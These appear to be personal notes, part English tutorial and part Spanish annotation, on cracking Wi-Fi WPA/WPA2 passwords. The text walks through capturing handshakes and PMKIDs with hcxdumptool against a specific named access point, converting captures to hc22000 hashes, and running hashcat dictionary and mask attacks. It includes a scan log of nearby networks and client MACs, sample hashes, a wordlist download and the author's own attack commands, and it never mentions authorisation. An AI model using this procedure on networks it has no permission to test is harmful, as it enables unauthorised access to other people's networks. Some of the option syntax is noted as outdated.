10:38:05 2437/6   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:305 RC:62969 KDV:2]
10:38:05 2437/6   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:374 RC:62969 KDV:2]
10:38:09 2437/6   5e9f065087b3 5404a6c6baf8 ASUS [PROBERESPONSE]
10:38:23 2437/6   008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:3364 RC:62969 KDV:2]
10:38:24 2437/6   ffffffffffff e8377a9a5eec Zyxel7 [BEACON]
10:38:59 2437/6   c83870adbb48 000e1726744c Keenetic-9158 [AUTHENTICATION]
10:38:59 2437/6   c83870adbb48 000e1726744c Keenetic-9158 [REASSOCIATION]
10:39:10 2437/6   c25b1b088ab7 e8377a9a5eec Zyxel7 [PROBERESPONSE]
10:40:02 2442/7   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1987 RC:62969 KDV:2]
10:40:14 2442/7   ffffffffffff fcf528482fd4 RT-64 [BEACON]
10:40:37 2442/7   0c89106f809f e4186b20f57c RT-104 [PROBERESPONSE]
10:41:17 2442/7   ffffffffffff 8c10d45ea252 ASUS [BEACON]
10:41:33 2442/7   ffffffffffff e4186b20f57c RT-104 [BEACON]
10:42:00 2447/8   ffffffffffff 52ff2042ca83 [HIDDEN BEACON]
10:42:00 2447/8   ffffffffffff 50ff2038858b Keenetic-6515 [BEACON]
10:42:00 2447/8   b8c6aa35393d 50ff2062ca83 Keenetic-8321 [PROBERESPONSE]
10:42:00 2447/8   ffffffffffff 52ff2048858b [HIDDEN BEACON]
10:42:04 2447/8   74dfbf07a943 50ff2038858b Keenetic-6515 [PROBERESPONSE]
10:42:04 2447/8   ffffffffffff 50ff2062ca83 Keenetic-8321 [BEACON]
10:42:05 2447/8   ffffffffffff 50ff20073258 Keenetic [BEACON]
10:42:12 2447/8   ffffffffffff 5cf4abcf3898 Keenetic-0230 [BEACON]
10:42:18 2447/8   74dfbf07a943 000e1726744d pbc [AUTHENTICATION]
10:42:18 2447/8   74dfbf07a943 000e1726744d pbc [ASSOCIATION]
10:43:15 2447/8   ffffffffffff 52ff2049b53b [HIDDEN BEACON]
10:43:21 2447/8   ffffffffffff 50ff2069b53b Keenetic-5575 [BEACON]
10:43:21 2447/8   f63498e66843 50ff2069b53b Keenetic-5575 [PROBERESPONSE]
10:44:04 2452/9   ffffffffffff 50ff20340c5c Guardiwe [BEACON]
10:44:05 2452/9   ffffffffffff 52ff20440c5c [HIDDEN BEACON]
10:44:08 2452/9   e6fda11634b8 28285d698a22 Keenetic-9158 [PROBERESPONSE]
10:44:17 2452/9   ffffffffffff e4186b28a77c Keenetic-2597 [BEACON]
10:44:30 2452/9   ffffffffffff 52ff20430433 [HIDDEN BEACON]
10:44:51 2452/9   9c8c6e7a522b 50ff20340c5c Guardiwe [PROBERESPONSE]
10:44:58 2452/9   1801f1676c56 e4186b28a77c Keenetic-2597 [PROBERESPONSE]
10:45:31 2452/9   daa119ea356f 8c10d45ea252 ASUS [PROBERESPONSE]
10:45:43 2452/9   0c89106f809f 50ff20630433 Keenetic-3643 [PROBERESPONSE]
10:45:54 2452/9   ffffffffffff 50ff20630433 Keenetic-3643 [BEACON]
10:46:01 2457/10  ffffffffffff 142e5e562778 RT-WiFi-17 [BEACON]
10:46:07 2457/10  60d9a0e9b9d8 142e5e562778 RT-WiFi-17 [PROBERESPONSE]
10:46:19 2457/10  0c89106f809f 88a6c6dadcd2 RT-WiFi_2 [PROBERESPONSE]
10:46:31 2457/10  ffffffffffff f07d6895c48a dlink [BEACON]
10:48:00 2462/11  ffffffffffff 9eaed3b01bf5 DIRECT-Ks-EPSON-WF-M5799 Series [BEACON]
10:48:03 2462/11  402f86f57436 9eaed3b01bf5 DIRECT-Ks-EPSON-WF-M5799 Series [PROBERESPONSE]
10:48:05 2462/11  ffffffffffff 28285de857ba wifi110 [BEACON]
10:48:20 2462/11  ffffffffffff e8377a91ddec Keenetic-8836 [BEACON]
10:49:10 2462/11  1801f1347236 ec43f6039d00 [ESSID NOT RECEIVED YET] [AUTHENTICATION]
10:49:10 2462/11  1801f1347236 ec43f6039d00 Keenetic-1768 [ASSOCIATION]
10:49:10 2462/11  1801f1347236 ec43f6039d00 Keenetic-1768 [EAPOL:M1M2ROGUE EAPOLTIME:4251 RC:62969 KDV:2]
10:50:00 2467/12  ffffffffffff 0471535b3b24 RT-WiFi-3B22 [BEACON]
10:50:01 2467/12  7c25da605049 0471535b3b24 RT-WiFi-3B22 [PROBERESPONSE]
10:51:03 2467/12  008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:634 RC:62969 KDV:2]
10:51:03 2467/12  008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:59 RC:62969 KDV:2]
10:52:00 2472/13  ffffffffffff 78321b4eec98 DIR-615-Svetlana [BEACON]

You can find an explanation of the terms in the “Abbreviations” section on the
program page: https://en.kali.tools/?p=841.

Attack a specific AP

To attack a specific Access Point, assuming that you know its name (ESSID), you need
to know the channel on which it operates and its MAC address (BSSID). This
information can be collected by running hcxdumptool with the --do_rcascan option:

sudo hcxdumptool -i wlp0s20f0u2 --do_rcascan

Let's say I'm interested in an access point with the network name RT-728005:

BSSID        FREQ   CH RSSI BEACON RESPONSE ESSID  SCAN-FREQ: 2422 INJECTION-RATIO:  27% [12:51:31]
-----------------------------------------------------------------------------------------------------
…
…
 c891f9c7eff6 2412    1  113     47       34 RT-728005
…
…

You need to add options to the hcxdumptool command:

  • --filtermode=CHANNEL
  • --filterlist_ap=MAC_OR_FILE_WITH_MAC

For example, the RT-728005 AP that interests me works on the first channel and has
BSSID c891f9c7eff6, then the command is as follows:

sudo hcxdumptool -i wlp0s20f0u2 -o RT-728005.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap=c891f9c7eff6 -c 1

                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
[hcxdumptool-21]                                                                                 

Captured wireless frames are saved to file RT-728005.pcapng. Convert this file to
hash:

hcxpcapngtool -o RT-728005.hc22000 -E wordlist RT-728005.pcapng

                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
[hcxpcapngtool]                                                     

Viewing hash information:

hcxhashtool --info=stdout -i RT-728005.hc22000

                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
[hcxhashtool]                                       

This ends the online stage. Now you can start Network Manager again:

sudo systemctl start NetworkManager

Convert captured data to hash

To convert capture to the hash, use the following command:

hcxpcapngtool -o HASH.hc22000 -E WORDLIST CAPTURE_FILE.pcapng

In this command:

  • HASH.hc22000 is a file where all converted hashes will be placed
  • WORDLIST is a list of strings, including the names of the APs seen (ESSID), as
    well as strings transmitted in cleartext – sometimes you can see the Wi-Fi
    password here, some especially poorly designed devices can transmit it in
    plaintext
  • CAPTURE_FILE.pcapng is a file with wireless frames that we captured in the
    previous step

Command example:

hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng

The hash.hc22000 file will be created with hashes and statics of the captured data
will be displayed:

                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
                                                                    
[hcxpcapngtool-2]                                                   

Hashes example:

WPA*02*cf8d06ec4aeba37f5288e65ad802f5d3*10ae604c41e6*d4124342bd39*54502d4c696e6b5f303132365f455854*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53c8d7a67dcf998fcc7e71de2b8fc076845c7fce4b04c7f1a52a67f03c2970bfc34000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*10
WPA*02*db391bf2742b8f862aa0656f4a3ab063*10ae604c41e7*b4fbe33717a0*616b3834*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53c54c7c5c35fead373561cc26664649e6f6d3664765abdba3e1396442e3dbf7043000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*10
WPA*02*3d40af734bfaaaeb4649e0eab240a39e*10ae604c41e8*ee48b8e81589*54502d4c696e6b5f303132365f3547*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53c93bb8236f147d14d1f562b4f59cf7b050dc4b76f6faa5fdd0aa9cc233b6b06b5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*10
WPA*02*efb03520bbd51818ff1bedd948633d0d*1c3bf3110126*28565a0ce1b1*54502d4c696e6b5f30313236*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53c684d1db707cb77070f2f82f2e7dcc3d13588651a03283cd42e5ceab8dcc4ab57000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*10
WPA*02*4dd975abac76732237967a7751880a27*52ff20513c4c*b4fbe33717a0*616b3834*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53cab25d6ef96c3a0295c2849e02799b777f6aa88a0169d645547f4c72862d7092b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*10
WPA*02*f8021dd2fbac283ed9abbae33d507636*68ff7b2b33d0*420a96ef1527*54502d4c696e6b5f333343455f3547*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0203007502010a0010000000000000f53ceeaa8e20f3d31a31ed31b99431c72fff3b8a8b4568bdf09bc68b952742a484c9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020c00*10
WPA*02*87ca0740cc9115d80092b4481ccd0f7f*68ff7b2b33d0*5e02e859bc68*54502d4c696e6b5f333343455f3547*71159d9a8e714aabb36f449f603bcc3a5b1d754c5ee756b314e4ee8e475e31fa*0103007502010a001000000000000000010335e9a1c1859746102aa540f063c6d2843ac8b6334b23aab61a1441564d4448000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020c00*02
WPA*02*2b25289c5d103de4455c605185f16799*68ff7b2b33d0*6e4138786697*54502d4c696e6b5f333343455f3547*dbb9bae2cb780756c822938f252ac6c231b8246cd85e77fdcc985ee97ed35de8*0103007502010a0000000000000000f53c0a63db353cb974e01b619ccb5a2505ed25df29630f9dab7ff09a6e7579095024000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac02ac24*10
WPA*01*472dca0f8d8fddc252c3eb15f8fe77ab*8c10d4c712b6*b0febd84cfaa*526f7374656c65636f6d5f433731324236***
WPA*01*784d7491048ba9d3fa68f64e294453cf*b09575bddc88*b0febd84cfaa*54502d4c696e6b5f444338365f3547***
WPA*01*b07fec80cc50c50aeddf66d599d24f2b*cc32e5b688f2*b0febd84cfaa*54502d4c696e6b5f383846305f3547***
WPA*01*8037d5a102f36040899b8c66f440c44b*e8018d3f4418*b0febd84cfaa*66685f336634343138***
WPA*02*2c68c0106fca98afb4ced71b9fc9d9c9*e848b8e81588*d4124342bd39*54502d4c696e6b5f303132365f455854*a736810c5a6dffb7317c1c88ca16afe6572762f186674e71879bcbb0c53e820b*0103007502010a00000000000000000001fbf958785389e5a6d68fd7446e2a0f4a858632bf4d103b73b66d6cc459622c0b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*02

The hash structure is as follows:

PROTOCOL*TYPE*PMKID/MIC*MACAP*MACCLIENT*ESSID*ANONCE*EAPOL*MESSAGEPAIR

Where:

  • PROTOCOL = Fixed string "WPA"
  • TYPE = 01 for PMKID, 02 for EAPOL
  • PMKID/MIC = PMKID if TYPE=01, MIC if TYPE=02
  • MACAP = MAC of AP
  • MACCLIENT = MAC of CLIENT
  • ESSID = network name (ESSID) in HEX
  • ANONCE = ANONCE
  • EAPOL = EAPOL (SNONCE is in here)
  • MESSAGEPAIR = Bitmask:
  • 0: MP info (https://hashcat.net/wiki/doku.php?id=hccapx)
  • 1: MP info (https://hashcat.net/wiki/doku.php?id=hccapx)
  • 2: MP info (https://hashcat.net/wiki/doku.php?id=hccapx)
  • 3: x (unused)
  • 4: ap-less attack (set to 1) - no nonce-error-corrections necessary
  • 5: LE router detected (set to 1) - nonce-error-corrections only for LE necessary
  • 6: BE router detected (set to 1) - nonce-error-corrections only for BE necessary
  • 7: not replaycount checked (set to 1) - replaycount not checked,
    nonce-error-corrections definitely necessary

To view information about hashes, use the hcxhashtool utility:

hcxhashtool --info=stdout -i FILE.HASH

For instance:

hcxhashtool --info=stdout -i hash.hc22000

A list of hashes and their characteristics will be displayed.

                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
                                                                                                                        
[hcxhashtool-2]                                                                                                         

hcxhashtool has a number of filters, the most useful of which are:

--essid=<ESSID>              : filter by ESSID
--essid-part=<part of ESSID> : filter by part of ESSID
--essid-list=<file>          : filter by ESSID file
--mac-skiplist=<file>        : exclude MAC from file
                               format: 001122334455, 00:11:22:33:44:55, 00-11-22-33-44-55 (hex)

For example, the following command will display information only about the AP named
TP-Link_0126

hcxhashtool --info=stdout -i hash.hc22000 --essid=TP-Link_0126

If you want to extract a single hash, or exclude certain hashes, then use the filter
(given above or from the full list https://en.kali.tools/?p=847#hcxhashtool of
options), as well as the -o option, after which specify the file, in which the
selected hashes should be stored:

hcxhashtool -i hash.hc22000 --essid=ak84 -o ak84.hc22000

If you want only one hash for each Access Point, then use the following
construction:

cat hash.hc22000 | sort -t "*" -k 6,6 -u > hash.hc22000.uniq
hcxhashtool --info=stdout -i hash.hc22000.uniq

Password cracking

An example of launching a dictionary attack, hashes are stored in the hash.hc22000
file.

Downloading the dictionary:

wget https://wpa-sec.stanev.org/dict/cracked.txt.gz

Run brute force:

hashcat -m 22000 -a 0 hash.hc22000 cracked.txt.gz

Mask attack example:

hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d

Options that might come in handy:

  • --hwmon-temp-abort=100
  • -d 1

Examples of my real commands:

hashcat --hwmon-temp-abort=100 -a 0 -m 22000 -d 1 RT-728005.hash rockyou_cleaned.txt
hashcat --hwmon-temp-abort=100 -a 3 -m 22000 -d 1 RT-728005.hash ?d?d?d?d?d?d?d?d






### -i wlan0mon --> as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set  its own monitor mode!!!!!

### Cadena de scripts que hay que usar: 
`hcxdumptool -> hcxpcapngtool -> hcxhashtool (additional hcxpsktool/hcxeiutool) -> Hashcat`

```bash
sudo su
ifconfig # Ver nombre de tu interfaz WiFi.
airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto 
echo "BSSID" > myfilter.txt
hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1
hcxdumptool -o capture.pcap -i wlp1s0 
hcxpcaptool -m pmkid_hash.txt capture.pcap
```

En la versión 6.3.0 las opciones fueron reemplazadas por:

`-o` fue reemplazado por `-w`
`--filterlist=f2-text.txt` fue reemplazado por `--bpf`
`--filtermode=2` fue reemplazado por `--bpf`




```bash
git clone https://github.com/ZerBea/hcxdumptool
make
sudo make install
hcxdumptool -I 
hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status=15

```

Posibles errores:

```bash
Possible reasons:
 driver is broken
 driver is busy (misconfigured system, other services access the INTERFACE)
4772 Packet(s) captured by kernel
```
Solución: 

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/

#### Si querés seguir este tutorial que ya está desactualizado yo me bajé la versión 6.0.6 
Primero de todo tenés que matar `wpa_supplicant` y `NetworkManager`:
```bash
sudo airmon-ng check kill
```

https://miloserdov.org/?p=7801

Los parámetros de ese tutorial funcionan con esta versión:    
https://github.com/ZerBea/hcxdumptool/archive/refs/tags/6.0.6.tar.gz

